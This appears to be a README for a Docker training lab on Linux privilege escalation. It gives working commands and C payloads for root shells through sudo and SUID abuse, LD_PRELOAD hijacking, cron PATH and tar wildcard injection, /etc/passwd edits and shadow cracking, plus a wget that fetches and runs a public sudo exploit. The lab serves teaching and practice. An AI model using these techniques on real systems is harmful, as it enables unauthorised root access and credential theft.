# Linux PrivEsc Container

A Docker container designed for practicing and learning Linux Privilege Escalation techniques.

Linux systems provide many different paths for privilege escalation. Understanding these techniques is essential for penetration testers and red teamers, but it is equally valuable for blue teamers, security defenders, and system administrators who need to understand how attackers abuse misconfigurations.

This Docker container demonstrates some of the most important and commonly used Linux privilege escalation techniques. However, due to the containerized nature of the project and the goal of supporting both Docker on Linux and Docker Desktop on Windows, some techniques, such as kernel exploits and NFS service misconfigurations are not included.



# Quick Setup

## Build the Docker Image

Build the Docker image using the following command:

```bash
docker build -t linprivimg .
```

## Run the Container

Start the container:

```bash
docker run -d --name LinPrivEsc -p 22:22 linprivimg
```

Depending on your system configuration, you may need to grant additional privileges to the container for some examples in this guide to work correctly:

```bash
docker run --cap-add=DAC_READ_SEARCH -d --name LinPrivEsc -p 22:22 linprivimg
```

## Connect to the Container

Connect to the container using SSH:

```
Username: user
Password: password
```

# Quick Guide

This section provides a quick guide of various vulnerabilities and misconfigurations inside our container that can be leveraged to escalate privileges to root.



## 1. Exposed Passwords in Shell History and Configuration Files

Sensitive credentials are sometimes stored unintentionally in shell history files, configuration files, or backup files. These exposed credentials can allow attackers to gain access to additional accounts or higher privileges.

### Searching for Exposed Passwords in Shell History

Shell history may contain previously executed commands, including commands that reveal passwords or sensitive information.

```bash
history
```

### Searching for Exposed Passwords in Configuration Files

Configuration files may contain stored authentication information, such as VPN credentials or service passwords.

Example:

```bash
cat myvpn.ovpn
```

```bash
cat /etc/openvpn/auth.txt
```



## 2. Brute Force the Root Password

Weak passwords can allow attackers to gain root privileges by performing brute-force attacks against local authentication mechanisms.

Use the `suBF.sh` (`su-bruteforce`) script to brute force the root password:

```bash
./suBF.sh -u root -w top12000.txt
```

## 3. Stealing SSH Backup Keys

Improperly stored SSH private keys can allow unauthorized users to authenticate as another account, including privileged users such as root.

Search for stored SSH keys, especially inside `.ssh` directories. in our Container, locate the "/home/.ssh" directory:

```bash
cat id_ed25519
```

After obtaining the private key, transfer it to the attacker machine and use it for authentication:

```bash
ssh root@192.168.1.10 -i root_key
```


## 4. Incorrect Permissions on Operating System Files

Incorrect permissions on critical operating system files can expose sensitive information or allow unauthorized modifications. 

### Checking for Writable System Files

Files such as `/etc/passwd` and `/etc/shadow` should have strict permissions and they do by default. check the permissions on these files:

```bash
ls -l /etc/passwd
ls -l /etc/shadow
```

### Writable `/etc/passwd` File

The `/etc/passwd` file contains user account information without passwords, but a password can still be assigned to a user inside this file.

Add a new root user to passwd file, start by generating a password hash:

```bash
openssl passwd Hacked
```

Add the new user to /etc/passwd file, replace the "HASH" with output of above command:


```bash
echo admin:x:0:0:root:/root:/bin/bash >> /etc/passwd
```
Switch to the new user:

```bash
su admin
whoami
```
### Readable `/etc/shadow` File

This file should not be readable by default, if read access is granted, password hashes can be extracted and cracked.
Read the /etc/shadow file and extract the hash of root user:

```bash
cat /etc/shadow
```

Copy and crack in attacker machine using john the ripper and a passwordlist:

```bash
john --format=crypt --wordlist=passlist.txt hash.txt
```


## 5. Sudo Privilege Escalation

The `sudo` mechanism allows administrators to delegate specific privileges to users. Incorrect sudo configurations can unintentionally allow users to perform unauthorized administrative actions.
Check which commands the current user can execute with elevated privileges:

```bash
sudo -l
```

### Common Sudo Misconfiguration Examples

Some programs can provide unexpected privilege escalation paths when configured incorrectly.

Using Vim:

```bash
sudo vim -c '!sh'
```

Using Awk:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

Using Find:

```bash
sudo find . -exec /bin/sh \; -quit
```

Using Less:

```bash
sudo less /etc/hosts
!/bin/sh
```

Instead of getting a shell, You can also use various binaries to read inaccessible files or edit them:

Using apache2ctl to read restricted files:

```bash
LFILE=/etc/gshadow
sudo apache2ctl -c "Include $LFILE" -k stop
```

Using nano to edit "/etc/sudoers":

```bash
sudo nano /var/opt/../../etc/sudoers
```


## 6. SUID and SGID Privilege Escalation

SUID (Set User ID) and SGID (Set Group ID) permissions allow programs to run with the privileges of their owner or group.

While these permissions are sometimes required, incorrectly configured SUID/SGID binaries can create security risks.

Start by searching the system for files with SUID permissions:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Abuse the timeout binary:

 ```bash
timeout 0 /bin/sh -p
```
Abuse the strace binary:

 ```bash
strace -o /dev/null /bin/sh -p
```
Abuse the grep binary in order to read restricted files:

 ```bash
LFILE=/etc/gshadow
grep '' $LFILE
```
Investigate suid-env with "strings" for a possible path to privilege escalation:

```bash
strings /usr/local/bin/suid-env
```
Output of "strings" shows that this binary uses relative path of "service" binary in order to start apache2 service, we can compile our own "service" binary and abuse the relative path feature:

```bash
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc -w /tmp/service.c -o /tmp/service
```

Add the location of compiled binary to PATH: 

```bash
export PATH=/tmp:$PATH
```
Run the suid-env:

```bash
/usr/local/bin/suid-env
```

## 7. Privilege Escalation Using `LD_LIBRARY_PATH` and `LD_PRELOAD`

Linux dynamic linking mechanisms such as `LD_LIBRARY_PATH` and `LD_PRELOAD` can be abused when misconfigured programs are executed with elevated privileges.

These techniques rely on loading custom shared libraries into privileged processes.

Start by checking the current sudo permissions and env_keep values:
```bash
sudo -l
```

### Exploiting `LD_PRELOAD`

Create a shared library file(shell.c):

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

Compile the library:

```bash 
gcc -w -fPIC -shared -nostartfiles -o shell.so shell.c
```

Run a binary with sudo permissions while loading the custom library along with it:

```bash 
sudo LD_PRELOAD=/home/user/shell.so more
```



### Exploiting `LD_LIBRARY_PATH`

Programs may load shared libraries from directories specified in `LD_LIBRARY_PATH`.

First, identify the libraries used by a privileged binary(that is, binaries that you can run with sudo access):

```bash 
ldd /bin/vim
```

Choose a library(for example "libz.so.1") and create lib.c:

```c 
#include <stdio.h>
#include <stdlib.h>

static void shell() __attribute__((constructor));

void shell() {
    unsetenv("LD_LIBRARY_PATH");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compile the shared library:

```bash 
gcc -w -fPIC -shared -o libz.so.1 lib.c
```

Execute the binary while specifying the custom library path:

```bash
sudo LD_LIBRARY_PATH=/home/user vim
```


## 8. Cron Jobs Privilege Escalation

Cron jobs are scheduled tasks that run automatically on Linux systems. Misconfigured cron jobs can allow unauthorized users to execute commands and binaries with elevated privileges.

Check the system-wide cron configuration:

```bash id
cat /etc/crontab
```

Look for scheduled tasks running as root and identify scripts or directories that may be writable by other users.

### Exploiting Relative Path Usage

Scripts that rely on relative paths can be vulnerable if an attacker can modify the search path. the "getopenports.sh" script relies on a relative path for execution. 

Review the the PATH variable inside the crontab and your shell:

```bash
echo $PATH
```


Check permissions on directories included in PATH:

```bash 
ls -ld /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin /usr/games /usr/local/games /snap/bin /root/scripts
```
A writable directory in the PATH allows replacement of executed script, that is if the path in question has higher execution priority(is more to the left side of PATH output). we do not know the location of getopenports.sh script, but judging by PATH variable in crontab, "/root/scripts" directory that is located to the most right, is a good candidate. 
since "/usr/local/games" is writable, we can create and execute our script from there.

```bash 
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/games/getopenports.sh
chmod +x /usr/local/games/getopenports.sh 
```

Wait, run and Check your privilege:

```bash 
/tmp/bash -p
whoami
```


### Writable Cron Scripts

Check permissions on scheduled scripts, If a script executed by root is writable, modifications may result in privilege escalation.

In here the backup.sh is writable:

```bash
ls -l /usr/local/bin/backup.sh
```
Write to it to get a root shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /usr/local/bin/backup.sh
```
Wait and check your privilege:

```bash 
/tmp/bash -p
whoami
```


### Wildcard Injection in Cron Jobs

Scripts using wildcard characters with commands such as `tar` may introduce security issues if filenames are interpreted as command options.

Review compress.sh script:

```bash 
cat /usr/local/bin/compress.sh
```
Exploit:

```bash 
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
chmod +x /home/user/runme.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```
Wait and check your privilege:
```bash 
/tmp/bash -p
whoami
```

## 9. Shared Object Injection

Shared object injection occurs when a privileged program loads shared libraries from locations that can be modified by unprivileged users.

Start by searching for SUID binaries:

```bash 
find / -type f -perm -04000 -ls 2>/dev/null
```

Use `strace` to inspect which libraries a program attempts to load, we will use suid-so:

```bash 
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```

If a required library is missing and the loading path is writable, the program may be vulnerable. Here libcalc.so library and it's parent directory are missing.

Create the required directory structure:

```bash 
mkdir /home/user/.config
cd /home/user/.config
```

Create the shared library file:

```c 
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    system("/bin/bash -p");
}
```

Compile the libcalc.so:

```bash 
gcc -w -shared -fPIC -o /home/user/.config/libcalc.so /home/user/.config/libcalc.c
```

Run the vulnerable program:

```bash 
/usr/local/bin/suid-so
```


## 10. Exploiting System Binary Vulnerabilities

System components and installed software may contain vulnerabilities that can be abused to gain elevated privileges.

In this example, we examine vulnerabilities in `sudo`, specifically CVE-2021-3156.

First, check the installed sudo version:

```bash
sudo --version
```

Compare the installed version against known vulnerable versions. for CVE-2021–3156, run the following command to check whether the installed version is affected:

```bash 
sudoedit -s Y
```
Since it prompts for a password, our sudo binary is vulnerable

Exploit:
```bash 
wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/refs/heads/main/exploit_nss.py

chmod +x exploit_nss.py

./exploit_nss.py
```


## 11. Privilege Escalation Using Linux Capabilities

Linux capabilities provide a more granular alternative to traditional root privileges. They allow specific privileges to be assigned to individual processes or binaries.

Incorrectly assigned capabilities can create privilege escalation opportunities.

Find binaries with assigned capabilities:

```bash 
getcap -r / 2>/dev/null
```

Abusing Python binary to gain root shell:

```bash 
./python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Some binaries with capabilities may allow reading files and directories that are normally restricted.

Viewing restricted files:

```bash 
head /etc/gshadow
```

Viewing restricted directories:

```bash 
tree /root/
```



## 12. Privilege Escalation Using Services

Linux services often run with elevated privileges. Incorrect service configurations, writable service files, or insecure service binaries can introduce privilege escalation opportunities.


List available services:

```bash
service --status-all
```

Check for possible write privileges in service files

```bash 
ls -l /etc/init.d/
```

PyWeb service is writable, edit the PyWeb service file:

```bash 
nano /etc/init.d/PyWeb
```

Replace the first few lines with the codes below:

```bash
DAEMON=/bin/bash
SCRIPT=/home/user/shell.sh
PIDFILE=/var/run/PyWeb.sh
```
Create shell.sh:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/shell.sh
chmod +x /home/user/shell.sh
```

Wait and then run the below commands:

```bash 
/tmp/bash -p 
whoami
```

Service binaries should also be checked for incorrect permissions. in here since "/usr/local/bin/webserver.py" is writable, change it's content to gain privilege.

Example:

```python 
import shutil, os

shutil.copy('/bin/bash', '/tmp/bash')
os.chmod('/tmp/bash', 0o4755)
```

